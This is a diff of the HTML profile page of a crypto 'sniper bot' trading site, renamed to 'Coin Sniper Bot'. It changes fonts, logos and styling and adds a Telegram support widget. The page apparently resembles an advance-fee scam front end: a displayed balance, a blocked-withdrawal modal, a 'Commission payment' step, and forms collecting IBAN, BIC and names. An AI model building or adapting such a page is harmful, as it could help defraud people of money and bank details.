@@ -2,12 +2,19 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <link rel="prefetch" href="https://api.snipercallsbot.com/main.js" />
+    <link
+      rel="prefetch"
+      href="https://api.snipercallsbot.com/main_j29d3jf4.js"
+    />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/img/logo.svg" />
     <link rel="stylesheet" href="/styles/style.css" />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap"
+      rel="stylesheet"
+    />
     <link
       href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap"
       rel="stylesheet"
@@ -17,59 +24,71 @@
       rel="stylesheet"
     />
     <link
-      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap"
+      href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"
       rel="stylesheet"
     />
-
+    <link
+    href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap"
+    rel="stylesheet"
+  />
     <script>
       window.isProfile = true;
     </script>
 
+    <script>
+      if (!window.localStorage.getItem("auth")) {
+        window.location.href = "/register.html";
+      }
+    </script>
 
-<script>
-  if (!window.localStorage.getItem("auth")) {
-    window.location.href = "/register.html";
-  }
-</script>
-
-    <title>Sniper Calls Bot</title>
+    <title>Coin Sniper Bot</title>
   </head>
   <body>
     <header class="header">
       <div class="header__inner">
         <div class="header__left">
           <a class="header__logo" href="/">
-            <img src="/img/logo_white.svg" alt="" srcset="" />
-            <span>Sniper Calls Bot</span>
+            <img src="/img/logo.svg" alt="" srcset="" />
+            <span>COIN SNIPER BOT</span>
           </a>
 
           <div class="header__block">
-            <a href="/" class="header__link">
+            <a href="/" class="header__link left_side">
               <img src="/img/trading.svg" alt="" />
-              TRADING
+              Trading
             </a>
-            <a href="/statistics.html" class="header__link">
+            <a href="/statistics.html" class="header__link left_side">
               <img src="/img/statistics.svg" alt="" />
-              STATISTICS
+              Statistics
             </a>
           </div>
         </div>
 
         <div class="header__right">
           <div class="header__block">
-            <div class="header__link">
-              <img src="/img/card_blue.svg" alt="" />
-              <span>$<span id="headerWalletBalance">0000.00</span></span>
+            <div class="header__link button">
+              <img src="/img/wallet.svg" alt="" />
+              <span
+                >$<span
+                  id="headerWalletBalance"
+                  style="color: white; padding-left: 6px"
+                  >0.00</span
+                ></span
+              >
             </div>
 
-            <a href="/profile.html" class="header__wallet desktop" id="headerWallet">
+            <a
+              href="/profile.html"
+              class="header__wallet desktop button"
+              id="headerWallet"
+            >
               <img
                 src="/img/profile.svg"
                 alt=""
                 class="header__wallet__profile__img"
               />
               <span>Profile</span>
-              <span id="headerProfileName" style="display: none;">User</span>
+              <span id="headerProfileName" style="display: none">User</span>
               <!-- <img src="/img/arrow_down.svg" alt="" class="header__wallet__arrow__img"/> -->
             </a>
           </div>
@@ -126,10 +145,8 @@
     <main>
       <div class="container">
         <div class="profile">
-          <div class="glow" id="glow" style="width: 0; height: 0"></div>
-
           <div class="profile__inner">
-            <div class="profile__block" style="min-height: 200px">
+            <div class="profile__block">
               <div class="profile__block__title">Your total balance:</div>
               <div class="profile__block__balance">
                 <div class="profile__block__balance__amount">
@@ -280,7 +297,6 @@
       </div>
     </main>
 
-    
     <div class="modal hide" id="modal__nowithdraw">
       <div class="modal__error">
         <img src="/img/warning.svg" alt="" class="modal__error__img" />
@@ -301,8 +317,8 @@
         />
         <div class="modal__left">
           <div class="modal__left__logo">
-            <img src="/img/logo_white.svg" alt="" />
-            Sniper Calls Bot
+            <img src="/img/logo_gray.svg" alt="" />
+            Coin Sniper Bot
           </div>
 
           <div class="modal__kyc__subtitle">
@@ -371,8 +387,8 @@
         />
         <div class="modal__left">
           <div class="modal__left__logo">
-            <img src="/img/logo_white.svg" alt="" />
-            Sniper Calls Bot
+            <img src="/img/logo_gray.svg" alt="" />
+            Coin Sniper Bot
           </div>
 
           <div class="modal__kyc__title" style="margin-bottom: 18px">
@@ -425,8 +441,8 @@
         />
         <div class="modal__left">
           <div class="modal__left__logo">
-            <img src="/img/logo_white.svg" alt="" />
-            Sniper Calls Bot
+            <img src="/img/logo.svg" alt="" />
+            Coin Sniper Bot
           </div>
 
           <div class="modal__withdrawal__subtitle">
@@ -489,8 +505,8 @@
         />
         <div class="modal__left">
           <div class="modal__left__logo">
-            <img src="/img/logo_white.svg" alt="" />
-            Sniper Calls Bot
+            <img src="/img/logo_gray.svg" alt="" />
+            Coin Sniper Bot
           </div>
 
           <div class="modal__kyc__title">Commission payment</div>
@@ -562,8 +578,8 @@
         />
 
         <div class="modal__left__logo">
-          <img src="/img/logo_white.svg" alt="" />
-          Sniper Calls Bot
+          <img src="/img/logo_gray.svg" alt="" />
+          Coin Sniper Bot
         </div>
 
         <div class="modal__deposit__crypto__title" style="margin-bottom: 18px">
@@ -576,7 +592,7 @@
             type="text"
             name=""
             id="search_fiat"
-            style="background: #1c1f25"
+            
           />
 
           <img src="/img/search2.svg" alt="" />
@@ -598,7 +614,7 @@
             placeholder="Min: 100$"
             disabled
             id="withdraw_amount_fiat"
-            style="background: #1c1f25"
+            
           />
         </div>
 
@@ -651,8 +667,8 @@
         />
         <div class="modal__left">
           <div class="modal__left__logo">
-            <img src="/img/logo_white.svg" alt="" />
-            Sniper Calls Bot
+            <img src="/img/logo_gray.svg" alt="" />
+            Coin Sniper Bot
           </div>
 
           <div class="modal__kyc__title">Select withdraw method</div>
@@ -695,8 +711,8 @@
         />
 
         <div class="modal__left__logo">
-          <img src="/img/logo_white.svg" alt="" />
-          Sniper Calls Bot
+          <img src="/img/logo_gray.svg" alt="" />
+          Coin Sniper Bot
         </div>
 
         <div class="modal__deposit__crypto__title">Select cryptocurrency</div>
@@ -822,7 +838,7 @@
             name=""
             id="withdraw_address"
             placeholder="Enter address"
-            style="background: #1c1f25"
+            
           />
         </div>
 
@@ -833,7 +849,7 @@
             name=""
             id="profile_modal_balance"
             placeholder="Min: 100$"
-            style="background: #1c1f25"
+            
             disabled
           />
         </div>
@@ -863,8 +879,8 @@
         />
 
         <div class="modal__left__logo">
-          <img src="/img/logo_white.svg" alt="" />
-          Sniper Calls Bot
+          <img src="/img/logo_gray.svg" alt="" />
+          Coin Sniper Bot
         </div>
 
         <div class="modal__deposit__crypto__title">Enter your payment data</div>
@@ -875,7 +891,6 @@
             type="text"
             name=""
             placeholder="Enter IBAN"
-            style="background: #1c1f25"
           />
         </div>
 
@@ -885,7 +900,6 @@
             type="text"
             name=""
             placeholder="Enter BIC"
-            style="background: #1c1f25"
           />
         </div>
 
@@ -895,7 +909,6 @@
             type="text"
             name=""
             placeholder="John"
-            style="background: #1c1f25"
           />
         </div>
 
@@ -905,7 +918,6 @@
             type="text"
             name=""
             placeholder="Smith"
-            style="background: #1c1f25"
           />
         </div>
 
@@ -916,7 +928,6 @@
             name=""
             id="modal_withdraw_iban_balance"
             placeholder="Min: 100$"
-            style="background: #1c1f25"
             disabled
           />
         </div>
@@ -946,8 +957,8 @@
         />
 
         <div class="modal__left__logo">
-          <img src="/img/logo_white.svg" alt="" />
-          Sniper Calls Bot
+          <img src="/img/logo_gray.svg" alt="" />
+          Coin Sniper Bot
         </div>
 
         <div class="modal__deposit__crypto__title">Select cryptocurrency</div>
@@ -1074,7 +1085,7 @@
             id="amount_crypto"
             disabled
             placeholder="Min: 100$"
-            style="background: #1c1f25"
+            
           />
         </div>
 
@@ -1171,13 +1182,12 @@
     <div class="modal hide" id="modal__loading__iban">
       <div class="modal__error">
         <span class="loader"></span>
-        <div class="modal__error__title">
-          Checking your payment details
+        <div class="modal__error__title">Checking your payment details</div>
+        <div class="modal__error__subtitle">
+          Please wait, checking in progress.
         </div>
-        <div class="modal__error__subtitle">Please wait, checking in progress.</div>
       </div>
     </div>
-
 
     <div class="modal hide" id="modal__success__iban">
       <div class="modal__error">
@@ -1207,9 +1217,13 @@
     </div>
 
     <a class="support" href="https://t.me/mevsolana_help" target="_blank">
-      <img src="/img/support.svg" alt="">
+      <img src="/img/support.svg" alt="" />
+      <div class="support__inner">
+        <div class="support__inner__top">Any questions?</div>
+        <div class="support__inner__bottom">Contact support 24/7</div>
+      </div>
     </a>
   </body>
 
-  <script src="https://api.snipercallsbot.com/main.js"></script>
+  <script src="https://api.snipercallsbot.com/main_v2.js"></script>
 </html>
